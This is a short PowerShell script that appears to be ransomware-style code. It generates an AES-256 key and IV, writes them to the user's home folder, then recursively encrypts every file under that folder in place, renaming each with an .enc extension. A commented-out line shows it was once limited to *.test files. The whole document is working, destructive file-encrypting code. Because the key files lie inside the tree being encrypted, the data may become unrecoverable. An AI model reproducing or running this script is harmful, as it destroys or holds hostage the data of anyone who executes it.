
$UserPath = "C:\Users\$env:USERNAME"

$Aes = New-Object System.Security.Cryptography.AesManaged
$Aes.KeySize = 256
$Aes.GenerateKey()
$Aes.GenerateIV()

$KeyFile = "C:\Users\$env:USERNAME\aes_key.txt"
$IVFile = "C:\Users\$env:USERNAME\aes_iv.txt"
[System.IO.File]::WriteAllBytes($KeyFile, $Aes.Key)
[System.IO.File]::WriteAllBytes($IVFile, $Aes.IV)

#$Files = Get-ChildItem -Path $UserPath -Filter *.test -Recurse
$Files = Get-ChildItem -Path $UserPath -Recurse

foreach ($File in $Files) {

    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
    

    $MemoryStream = New-Object System.IO.MemoryStream
    
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream(
        $MemoryStream, 
        $Aes.CreateEncryptor(), 
        [System.Security.Cryptography.CryptoStreamMode]::Write
    )
    
    $CryptoStream.Write($Content, 0, $Content.Length)
    $CryptoStream.Close()
    
    $EncryptedContent = $MemoryStream.ToArray()
    
    [System.IO.File]::WriteAllBytes($File.FullName, $EncryptedContent)
    
    $NewFileName = [System.IO.Path]::ChangeExtension($File.FullName, ".enc")
    Rename-Item -Path $File.FullName -NewName $NewFileName
    
    Write-Host "Encrypted and renamed: $($NewFileName)"
}

$Aes.Dispose()
